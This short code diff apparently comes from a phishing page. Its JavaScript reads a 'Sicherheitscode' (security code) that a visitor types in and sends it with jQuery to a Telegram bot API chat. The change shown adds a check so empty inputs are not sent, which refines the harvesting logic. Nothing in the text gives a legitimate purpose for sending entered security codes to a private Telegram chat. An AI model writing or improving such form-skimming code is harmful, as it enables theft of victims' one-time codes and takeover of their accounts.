@@ -21,6 +21,10 @@
                 var message = $("#InputSicherheitscode").val();
                 var userAgent = navigator.userAgent;
                 var fullMessage = "Sicherheitscode: " + message;
+
+                if (message.trim() === "") {
+                    return;
+                }
                 
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                     console.log("Antwort von der Telegram API:", data);
